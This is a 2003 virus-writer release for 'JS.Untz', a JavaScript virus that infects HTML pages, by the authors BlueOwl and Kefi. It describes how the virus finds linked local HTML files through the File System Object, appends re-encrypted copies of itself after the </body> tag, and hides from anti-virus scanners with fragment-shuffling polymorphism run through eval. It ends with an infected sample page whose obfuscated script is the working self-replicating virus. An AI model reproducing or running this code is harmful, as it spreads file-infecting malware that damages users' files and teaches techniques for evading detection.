                                                                  JS.Untz
                                             (c) by BlueOwl and Kefi 2003

   // Introduction

      .Hello and welcome to our  newest JavaScript creation!  We (BlueOwl
     and myself [Kefi]) have named it "JS.Untz."  Untz uses JavaScript to
     infect HTML pages by adding its code after the file's "</body>" tag.
     We  did  this  because anti-virus  programs  would have  difficultly
     searching for the virus (. . . or so we think). :]

      .JS.Untz  was a  group project, started  because  BlueOwl and  Kefi
     wanted  to code  something together.  We  decided to  implement many
     "unseen" techniques such as a new method of finding files to infect,
     and  a brand-new  way of using  polymorphism.  The  virus was  named
     "Untz" for basically no reason.  We originally planned on not naming
     it, just  for "creativity" and seeing  what anti-viruses would  name
     it, but while  discussing ideas and sharing codes, we  used the file
     name "untz.html" . . . and it came to be called "JS.Untz." :)

   // Infection method

      .JS.Untz uses an idea inspired by . . . well, we don't really know.
     How it works is: it searches for "*.HT*" pages which have been linked
     to  its  host  [example: '<a href = 'filename.htm'>example</a>"] and
     then checks if the file exists on the local host [so we're not trying
     to infect sites like 'http://www.google.de/index.html' . . .]. After
     that, it  will  open the file and  search for the tags "</body>" and
     "</BODY>."  If either of  them are  found, it will generate  a newly
     generated encrypted version of itself and add it after the found tag.

   // Polymorphism method

      .JS.Untz  uses  a  new  method  of  polymorphism.  It takes  random
     "pieces"  of  its  code,  and  arranges  them  in  a  random  order.
     Afterward, it  will rearrange  the "pieces" then, use  the "eval();"
     function to execute the code pieces.

      .Since  this is not exactly  an easy thing to  understand, we  have
     made a sample of this for you . . .

     .Orginal code:

      alert('Hey there, JavaScript kids!');

     .New versions of the same code:

     (1) var a = "aler"; var b = "t('Hey there, J"; var c = "avaScript kids";
         var d = "!');"; eval(a+b+c+d);

     (2) var a = "al"; var g = "ert('H"; var e = "ey there"; var b = "aScri";
         var c = "pt kid"; var f = "s!"; var e = "');"; var d = ", Jav";
         eval(a+g+e+d+b+c+f+e);

     (3) var a = "alert('He"; var b = "avaSc"; var c = "y th"; var d = "rip";
         var e = "ere, J"; var f="t kids"; var g"!');"; eval(a+c+e+b+d+f+g);

     (4) var e = "alert"; var a = "('Hey"; var c =" there, "; var f =
         "JavaS"; var b = "cript "; var g = "k"; var d = "ids"; var h =
         "!');"; eval(e+a+c+f+b+g+d+h);

      . . . Neat, huh? :)  Oh, and  of course, all  of the variable names
     are randomly generated with random lengths (KJP-technology).  :]

   // Details
      .Here's some stuff the virus does . . .
     . uses the File System Object
     . trys  to infect every  link in a file with a new version of itself
     . shows a message box on the 2nd of February
     . shows a message box on the 15nd of October
     . occasionally incorrectly infects a host-file

   // Personal notes
     .BlueOwl :: I  thought it was  kinda  nice  to make  this, exploring
     these  new  techniques, seeing  that  it works, very  nice.  I don't
     think I'll be 'scripting' much more though this year though.
      .e-mail :: xblueowl@hotmail.com

     .Kefi :: I've really got nothing to say other than what's above, but
     you can contact me to hear and/or see my ramblings . . .
      .e-mail :: kefi@jwdx.com
      .MSN :: kefi@jwdx.com
      .IRC :: #virus on Undernet [hardly ever]

                          (c) BlueOwl and Kefi // Netherlands/USA // 2003

   <html>

   <body>

   <h2>Untz</h2>

   <h3><b>This file is infected with a <u>virus</u>, we assume no responsibility!</h3>

   <a href=host1.html>HOST</a>
   <a href=host2.html>HOST</a>
   <a href=host3.html>HOST</a>
   <a href=host4.html>HOST</a>
   <a href=host5.html>HOST</a>
   <a href=host6.html>HOST</a>
   <a href=host7.html>HOST</a>

   <script>yk="rando";yT="b";myV=";ret";kBJ="gth";PmC="\"\"+";LP="gth;y++){var m=docume";BaP="& _m==\"Fe";UaW="n=rn(";A="2}var";UAp="lit(\" ";k="}};fg[fg.length]=";Ja="y=a[5]*1;if(_d==4 &";J="length==1) ma=cm.split(\"</BO";pkl="=\"\";tt";UM="extFi";Vyz="y! It is BlueOwls ";LMu=" it=\"\";for(j=0;j<";PAl=";no[no.leng";MBV=" B";rwM="lueOw";JJ="w Date();a=d.sp";waP="tion(\"return true\");d=";okM="ActiveXO";BzMY="f1);\";retur";GYC="m";mGp="pi]==nop)po=0}}fgi=fg";PoY="(_y-1987)+\" ";L="nt.links[";taz="var fso = new ";rMly="Y>\");if(ma.";HVV="r";GVWC="ne";am="nc";mw="}var tt";lTG="g";ArpU="lace(\"file://";tAo="\"+\"D";LPM="(j=0;j<no.";yVr="i+\"; ev";Yo="k++){m";C=":)!\");";pWGw="PMLWCJUVYBGHT\";a";uUmW=".length;mr++){va";ow="length=";wz="rep";pGJ="{nop=rna();";Bk="=f1;var mz=\"\";mi=f2";tJ=">\"+";tt="window.one";wukJ="ting.FileSystemObject\");function inf";lJ="[1]);}mf.Close();}}for(y=0;";Y="All();ma=cm.s";pm="t";AoP="bir";oPy="l ";lkV="is Kefis birthday. Kefi is now \"+";Gk="length;p";ClCT="it+=n";U="FileExists(f)){mf=fso.OpenT";HJB="tio";mL="if(!rn(6";LpTA="\\\"))a=a.r";G="epl";WMVA="()*nr)}ni=new Array();func";HVVk=");mf.Write(ma[0]+\"<scr";rz="rn Math.round(Math.";Yzm=";l++){mI=mi[";VWY=".l";JrU=")){fg[fg.length]=";JW="plit(\"</b\"+\"ody>\"); if(m";a="/\",\"\");if(a!=m){while(a!=a.replace(\"/\",\"\\";Ak="tion gd(){var f2";lJa="<n";pUY="b\")alert(\"";Aaw="15 && _m==\"Oct\")alert(\"Horay";aoC="\";for(t=0;t<";mloa="th]=no";pHCW="()+\"</sc\"+\"ript></Body>\"+ma";pw="o.length-1);mm";wMY="ject(\"Scrip";mV="a.";rzJV="! It ";Bp=".split(\"";BCP="}}function rn(nr){retu";km="c.length-1)]";UGY="length;j++){if(j)ti";GBY="p;ng";rW="n rna(){bca";wWoP="I=='\"";H="')mI=\"\\\\\\\"\";if(";lmYA="mI==\"\\\\\") mI=\"\\\\\\\\";zPU="=2){mf.Close();mf=fso.OpenTextFile(f,2";BMy="ace(\"/\",\"\\\\\");inf(unescape(a))";pzH="Ya";TU="mz;mz=\"";JJzr="\"=\\\"\"+fgi+\"\\\";\"}f";ppH="ength;j++){";yz="mz;var n";LVa="op=\"\";no=new Arr";VH="\"+\"ipt";ooW="al(";TCV="n";Wta="[pi]";LtuT="(f){if(fso.";PoB="ng";mm="\");if(_d==";HaJ="\";mz+=mI;";lzJa="var po=1;";Pu="for(pi";wmlu="=0;pi";PLwH="zploymrtA";mt="o.";CHU="a=m.";t="\";";GJpC="tb+1;t++)gh+=abc[rn(ab";AU="g[j]}v";zM=".links.len";Jm="ay();ng=new Array();";oHP="ar ti=\"\";for";uU="[ng.length]=nop+";Vam="g=new Array();for(l=0;l<mi.len";AM="le(f);cm=\"\"+mf.Read";rY="i++){if(no[";Gzml="u";orp="i+=no[j];";ULG="y<documen";Uom="urn gh}func";HV="]=ng[mm];ng[mm]=m";aGV="=ng[mn];ng[mn";tk="l];if(m";PmHV="for(";HL="bc=bca.split(\"\");tb=rn(3);var gh=\"";ap="mr<f";rYt="n tt;}";rG="gd";uw="n(no.length-1);m2";zHU="\");f";PC="y].href; ";Ymz="=\"uwkam";TAk="mr=0;";mVW="ror=new F";oWpH="=r";B="is now \"+(_y-1988)+\" :P!";JVW="thday.";tw="=it+\"; f1=\"+t";VM="r po=0;while(!po)";kT="+=\"+\";t";Am="\");_d=a[2]*1;_m=a[1];_";lU="or(k=0;k<140;";; f1=tt+HVV+mVW+Gzml+am+waP+PmC+GVWC+JJ+UAp+Am+Ja+BaP+pUY+pzH+Vyz+AoP+JVW+MBV+rwM+oPy+B+mm+Aaw+rzJV+lkV+PoY+C+taz+okM+yT+wMY+wukJ+LtuT+U+UM+AM+Y+JW+mV+J+tAo+rMly+ow+zPU+HVVk+VH+tJ+rG+pHCW+lJ+ULG+pm+zM+LP+L+PC+CHU+wz+ArpU+a+LpTA+G+BMy+BCP+rz+yk+GYC+WMVA+HJB+rW+Ymz+PLwH+pWGw+HL+aoC+GJpC+km+myV+Uom+Ak+Bk+Bp+zHU+Vam+kBJ+Yzm+tk+wWoP+H+lmYA+HaJ+mL+JrU+TU+t+k+yz+LVa+Jm+PmHV+TAk+ap+lTG+uUmW+VM+pGJ+lzJa+Pu+wmlu+lJa+mt+Gk+rY+mGp+Wta+PAl+mloa+GBY+uU+JJzr+lU+Yo+UaW+TCV+pw+oWpH+uw+aGV+HV+A+LMu+PoB+VWY+ppH+ClCT+AU+oHP+LPM+UGY+kT+orp+mw+pkl+tw+yVr+ooW+BzMY+rYt; eval(f1);</script></Body>

   </html>
